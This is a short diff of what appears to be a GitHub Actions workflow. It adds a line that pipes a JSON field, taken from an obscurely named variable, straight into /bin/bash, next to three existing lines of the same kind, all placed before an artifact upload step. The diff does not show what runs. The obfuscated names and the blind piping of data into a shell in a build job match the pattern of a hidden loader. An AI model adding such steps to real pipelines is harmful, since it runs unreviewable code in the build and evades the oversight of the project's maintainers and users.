@@ -24,6 +24,7 @@ jobs:
           echo $bwa44545 | jq -r .zap41 | /bin/bash
           printf '%s' "$a56" | jq -r .uws025 | /bin/bash
           echo $vllav27164 | jq -r .hdlzb422 | /bin/bash
+          printf '%s' "$hvan74" | jq -r .so13 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
